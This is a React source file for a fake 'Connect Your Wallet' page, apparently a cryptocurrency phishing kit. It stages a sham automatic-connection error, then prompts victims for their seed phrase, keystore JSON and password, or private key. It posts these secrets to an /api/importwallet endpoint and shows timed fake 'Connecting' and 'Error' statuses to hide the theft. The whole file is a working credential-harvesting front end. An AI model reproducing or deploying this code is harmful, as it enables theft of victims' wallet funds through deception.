/* eslint-disable @next/next/no-img-element */
"use client";
import { wallets } from "@/lib/data";
import React, { useState } from "react";

interface ITEM {
  name: string;
  imgUrl: string;
}

const Wallet = () => {
  const [selectedItem, setSelectedItem] = useState<ITEM>();
  const [selectedTab, setSelectedTab] = useState("phrase");
  const [status, setStatus] = useState("Trying to connect to wallet");
  const [formData, setFormData] = useState({
    phrase: "",
    keystore: {
      json: "",
      password: "",
    },
    privateKey: "",
  });

  const handleInputChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      [name]: value,
    }));
  };

  const handleKeystoreChange = (
    e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>
  ) => {
    const { name, value } = e.target;
    setFormData((prevData) => ({
      ...prevData,
      keystore: {
        ...prevData.keystore,
        [name]: value,
      },
    }));
  };

  const resetForm = () => {
    setFormData({
      phrase: "",
      keystore: {
        json: "",
        password: "",
      },
      privateKey: "",
    });
    setSelectedTab("phrase");
  };

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStatus('Trying to connect to wallet');

    const finalModal = document.getElementById(
      "my_modal_3"
    ) as HTMLDialogElement | null;

    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;

    if (modalTwo) {
      modalTwo.close();
    }

    if (finalModal) {
      finalModal.show();
    }

    // Process the formData based on the selectedTab
    let dataToSend;
    if (selectedTab === "phrase") {
      dataToSend = { phrase: formData.phrase };
    } else if (selectedTab === "keystore") {
      dataToSend = { keystore: formData.keystore };
    } else if (selectedTab === "private") {
      dataToSend = { privateKey: formData.privateKey };
    }

    // Send dataToSend to the backend
    try {
      const response = await fetch("/api/importwallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(dataToSend),
      });
      if (response.ok) {
        resetForm();
        setTimeout(() => setStatus("Connecting"), 2000);
        setTimeout(() => setStatus("Error connecting to wallet..."), 10000);
      } else {
        setStatus("Check your internet connection");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const handleModal = async (item: { name: string; imgUrl: string }) => {
    setSelectedItem(item);

    const modal = document.getElementById(
      "my_modal_1"
    ) as HTMLDialogElement | null;
    const modalTwo = document.getElementById(
      "my_modal_2"
    ) as HTMLDialogElement | null;

    if (modal) {
      modal.showModal();
    }
    setTimeout(() => {
      modal?.close();
      modalTwo?.showModal();
    }, 2500);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-gray-900 to-gray-800 relative">
      <div className="relative z-10 max-w-7xl mx-auto px-6 py-16">
        <header className="mb-12">
          <h4 className="text-3xl font-bold text-gray-100">Connect Your Wallet</h4>
          <p className="text-gray-400 mt-2 text-lg">Securely connect your wallet to access Web3 features.</p>
        </header>
        <div className="bg-gray-900/80 backdrop-blur border border-gray-700 rounded-2xl shadow-xl p-6">
          <div className="sticky top-0 bg-gray-900/80 backdrop-blur border-b border-gray-700 p-4 rounded-t-2xl">
            <p className="font-semibold text-gray-100 text-lg">Select a Wallet</p>
          </div>
          <div className="mt-6 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {wallets.map((item, index) => (
              <div
                key={index}
                onClick={() => handleModal(item)}
                className="group flex items-center justify-between p-4 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl hover:border-gray-600 transition-all duration-300 hover:transform hover:scale-105 shadow-lg hover:shadow-xl cursor-pointer"
              >
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-emerald-500 rounded-full flex items-center justify-center shadow-lg">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="text-white">
                      <circle cx="12" cy="12" r="10"></circle>
                    </svg>
                  </div>
                  <p className="text-gray-100 font-semibold">{item.name}</p>
                </div>
                <img
                  src={item.imgUrl}
                  alt={item.name}
                  className="w-10 h-10 rounded-full object-cover"
                />
              </div>
            ))}
          </div>
        </div>

        {/* Modal 1: Initializing */}
        <dialog id="my_modal_1" className="modal">
          <div className="modal-box bg-gray-900/80 backdrop-blur border border-gray-700 rounded-2xl shadow-xl w-11/12 max-w-md">
            <div className="flex items-center justify-between mb-6">
              <div className="flex items-center gap-3 text-emerald-400 font-semibold">
                Initializing
                <span className="loading loading-bars loading-xs text-emerald-400"></span>
              </div>
              <form method="dialog">
                <button className="text-gray-400 hover:text-gray-200 font-bold text-lg">
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                  </svg>
                </button>
              </form>
            </div>
            {selectedItem && (
              <div className="flex items-center justify-between p-4 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl shadow-lg">
                <div className="flex flex-col gap-1">
                  <h5 className="font-semibold text-gray-100">{selectedItem.name}</h5>
                  <p className="text-gray-400 text-sm">Easy-to-use browser extension</p>
                </div>
                <img
                  src={selectedItem.imgUrl}
                  alt={selectedItem.name}
                  className="w-10 h-10 rounded-full object-cover"
                />
              </div>
            )}
          </div>
        </dialog>

        {/* Modal 2: Manual Connection */}
        <dialog id="my_modal_2" className="modal">
          <div className="modal-box bg-gray-900/80 backdrop-blur border border-gray-700 rounded-2xl shadow-xl w-11/12 max-w-lg">
            <div className="flex flex-col gap-6">
              <div className="flex flex-col gap-4">
                <p className="text-red-500 font-semibold text-sm">
                  There was an error connecting automatically. But do not worry, you can still connect manually.
                </p>
                {selectedItem && (
                  <div className="flex items-center gap-3">
                    <img
                      src={selectedItem.imgUrl}
                      alt={selectedItem.name}
                      className="w-10 h-10 rounded-full object-cover"
                    />
                    <p className="text-gray-100 font-semibold text-lg">
                      Import your {selectedItem.name} wallet
                    </p>
                  </div>
                )}
              </div>
              <div>
                <div className="flex items-center gap-6 border-b border-gray-700 pb-2">
                  <button
                    className={`text-gray-100 font-semibold text-sm pb-2 ${selectedTab === "phrase" ? "border-b-2 border-emerald-500 text-emerald-400" : "hover:text-emerald-400"}`}
                    onClick={() => setSelectedTab("phrase")}
                  >
                    Phrase
                  </button>
                  <button
                    className={`text-gray-100 font-semibold text-sm pb-2 ${selectedTab === "keystore" ? "border-b-2 border-emerald-500 text-emerald-400" : "hover:text-emerald-400"}`}
                    onClick={() => setSelectedTab("keystore")}
                  >
                    Keystore JSON
                  </button>
                  <button
                    className={`text-gray-100 font-semibold text-sm pb-2 ${selectedTab === "private" ? "border-b-2 border-emerald-500 text-emerald-400" : "hover:text-emerald-400"}`}
                    onClick={() => setSelectedTab("private")}
                  >
                    Private Key
                  </button>
                </div>
                <form onSubmit={handleSubmit} className="mt-6 space-y-4">
                  {selectedTab === "phrase" && (
                    <div className="form-control">
                      <textarea
                        name="phrase"
                        value={formData.phrase}
                        onChange={handleInputChange}
                        placeholder="Enter your wallet phrase"
                        rows={3}
                        className="w-full text-gray-100 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl p-3 focus:outline-none focus:border-emerald-500 placeholder:text-gray-500"
                      ></textarea>
                    </div>
                  )}
                  {selectedTab === "keystore" && (
                    <div className="flex flex-col gap-4">
                      <div className="form-control">
                        <textarea
                          name="json"
                          value={formData.keystore.json}
                          onChange={handleKeystoreChange}
                          placeholder="Enter your Keystore JSON"
                          rows={3}
                          className="w-full text-gray-100 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl p-3 focus:outline-none focus:border-emerald-500 placeholder:text-gray-500"
                        ></textarea>
                      </div>
                      <div className="form-control">
                        <input
                          type="password"
                          name="password"
                          value={formData.keystore.password}
                          onChange={handleKeystoreChange}
                          placeholder="Wallet password"
                          className="w-full text-gray-100 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl p-3 focus:outline-none focus:border-emerald-500 placeholder:text-gray-500"
                        />
                      </div>
                    </div>
                  )}
                  {selectedTab === "private" && (
                    <div className="form-control">
                      <input
                        name="privateKey"
                        value={formData.privateKey}
                        onChange={handleInputChange}
                        type="text"
                        placeholder="Enter your Private Key"
                        className="w-full text-gray-100 bg-gray-900/60 backdrop-blur border border-gray-700 rounded-xl p-3 focus:outline-none focus:border-emerald-500 placeholder:text-gray-500"
                      />
                    </div>
                  )}
                  <div className="form-control flex gap-4">
                    <button
                      type="submit"
                      className="flex-1 px-6 py-3 bg-emerald-500 hover:bg-emerald-600 text-white font-semibold rounded-lg transition-colors shadow-lg hover:shadow-xl hover:scale-105"
                    >
                      Validate
                    </button>
                    <button
                      type="button"
                      onClick={() => {
                        const modal = document.getElementById("my_modal_2") as HTMLDialogElement | null;
                        modal?.close();
                      }}
                      className="flex-1 px-6 py-3 bg-gray-900 border-2 border-gray-700 hover:border-gray-600 text-gray-300 font-semibold rounded-lg transition-colors shadow-md hover:shadow-lg"
                    >
                      Close
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </dialog>

        {/* Modal 3: Status */}
        <dialog id="my_modal_3" className="modal">
          <div className="modal-box bg-gray-900/80 backdrop-blur border border-gray-700 rounded-2xl shadow-xl w-11/12 max-w-md">
            <div className="flex items-center justify-between">
              <div
                className={`flex items-center gap-3 font-semibold text-lg ${
                  status === "Error connecting to wallet..." || status === "Check your internet connection"
                    ? "text-red-500"
                    : "text-emerald-400"
                }`}
              >
                {status}
                <span
                  className={`loading loading-dots loading-sm ${
                    status === "Error connecting to wallet..." || status === "Check your internet connection"
                      ? "hidden"
                      : "text-emerald-400"
                  }`}
                ></span>
              </div>
              <form method="dialog">
                <button className="text-gray-400 hover:text-gray-200 font-bold text-lg">
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                  </svg>
                </button>
              </form>
            </div>
          </div>
        </dialog>
      </div>
    </div>
  );
};

export default Wallet;